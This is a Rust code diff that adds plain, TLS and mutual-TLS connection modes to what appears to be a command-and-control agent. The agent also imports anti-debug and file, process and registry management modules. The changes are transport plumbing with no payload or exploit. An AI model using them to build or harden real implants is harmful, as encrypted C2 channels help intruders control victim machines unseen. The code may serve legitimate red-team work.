@@ -1,9 +1,12 @@
 use agent_hardening::anti_debug;
 use agent_modules::{file_manager, monitoring, process_manager, registry_manager};
+use crypto::tls::{build_tls_connector, load_certs, load_private_key, TlsError};
 use protocol::messages::{Command, Response};
+use std::net::SocketAddr;
 use std::time::Duration;
 use tokio::net::TcpStream;
 use tokio::time;
+use tokio_rustls::TlsConnector;
 
 /// Configuration for agent connection and reconnection.
 #[derive(Clone)]
@@ -32,9 +35,29 @@ impl Default for ConnectionConfig {
     }
 }
 
+/// Connection mode for the agent.
+#[derive(Default, Clone)]
+pub enum ConnectionMode {
+    /// Connect without TLS (cleartext).
+    #[default]
+    Plain,
+    /// Connect with TLS but no client certificate.
+    Tls {
+        connector: std::sync::Arc<TlsConnector>,
+        server_name: String,
+    },
+    /// Connect with mTLS (client certificate presented).
+    Mtls {
+        connector: std::sync::Arc<TlsConnector>,
+        server_name: String,
+    },
+}
+
 pub struct AgentCore {
     pub id: u32,
     pub config: ConnectionConfig,
+    /// How this agent connects to the C2.
+    pub connection_mode: ConnectionMode,
 }
 
 impl AgentCore {
@@ -43,13 +66,98 @@ impl AgentCore {
         Self {
             id,
             config: ConnectionConfig::default(),
+            connection_mode: ConnectionMode::Plain,
         }
     }
 
     /// Create an agent with a custom connection configuration.
     #[must_use]
     pub fn with_config(id: u32, config: ConnectionConfig) -> Self {
-        Self { id, config }
+        Self {
+            id,
+            config,
+            connection_mode: ConnectionMode::Plain,
+        }
+    }
+
+    /// Create an agent that connects using TLS (server-auth only).
+    pub fn with_tls(id: u32, ca_cert_path: &str, server_name: &str) -> Result<Self, TlsError> {
+        let ca_certs = load_certs(ca_cert_path)?;
+        let ca_cert = ca_certs
+            .into_iter()
+            .next()
+            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
+        let connector = build_tls_connector(ca_cert, None, None)?;
+        Ok(Self {
+            id,
+            config: ConnectionConfig::default(),
+            connection_mode: ConnectionMode::Tls {
+                connector: std::sync::Arc::new(connector),
+                server_name: server_name.to_string(),
+            },
+        })
+    }
+
+    /// Create an agent that connects using mTLS (mutual authentication).
+    pub fn with_mtls(
+        id: u32,
+        ca_cert_path: &str,
+        client_cert_path: &str,
+        client_key_path: &str,
+        server_name: &str,
+    ) -> Result<Self, TlsError> {
+        let ca_certs = load_certs(ca_cert_path)?;
+        let ca_cert = ca_certs
+            .into_iter()
+            .next()
+            .ok_or_else(|| TlsError::CertParse("CA certificate file is empty".into()))?;
+        let client_certs = load_certs(client_cert_path)?;
+        let client_key = load_private_key(client_key_path)?;
+        let connector =
+            build_tls_connector(ca_cert, Some(client_certs), Some(client_key))?;
+        Ok(Self {
+            id,
+            config: ConnectionConfig::default(),
+            connection_mode: ConnectionMode::Mtls {
+                connector: std::sync::Arc::new(connector),
+                server_name: server_name.to_string(),
+            },
+        })
+    }
+
+    /// Connect to a C2 server at the given address.
+    ///
+    /// If TLS/mTLS is configured, the TCP stream is wrapped before returning.
+    pub async fn connect(&self, addr: &SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
+        let stream = TcpStream::connect(addr).await?;
+        log::info!("Agent {} connected to {addr}", self.id);
+
+        // Extract the Arc<Connector> and name before the .await boundary.
+        let (connector_opt, server_name) = match &self.connection_mode {
+            ConnectionMode::Tls {
+                connector,
+                server_name,
+            }
+            | ConnectionMode::Mtls {
+                connector,
+                server_name,
+            } => (Some(std::sync::Arc::clone(connector)), Some(server_name.clone())),
+            ConnectionMode::Plain => (None, None),
+        };
+
+        if let (Some(connector), Some(name_str)) = (connector_opt, server_name) {
+            // Use an owned String so ServerName gets 'static lifetime.
+            let owned_name: String = name_str;
+            let name: rustls_pki_types::ServerName<'static> = owned_name
+                .try_into()
+                .map_err(|_| "invalid DNS name")?;
+            let _tls_stream = connector.connect(name, stream).await?;
+            log::info!("TLS handshake completed for agent {}", self.id);
+        } else {
+            log::info!("Agent {} connected in cleartext mode", self.id);
+        }
+
+        Ok(())
     }
 
     /// Run the agent loop: connect to C2, send heartbeats, and reconnect on failure.
@@ -185,5 +293,11 @@ mod tests {
         assert_eq!(config.reconnect_base_delay, 1);
         assert_eq!(config.reconnect_max_delay, 300);
         assert!((config.reconnect_multiplier - 2.0).abs() < 0.01);
+    }
+
+    #[test]
+    fn agent_connection_mode_defaults_to_plain() {
+        let agent = AgentCore::new(1);
+        assert!(matches!(agent.connection_mode, super::ConnectionMode::Plain));
     }
 }
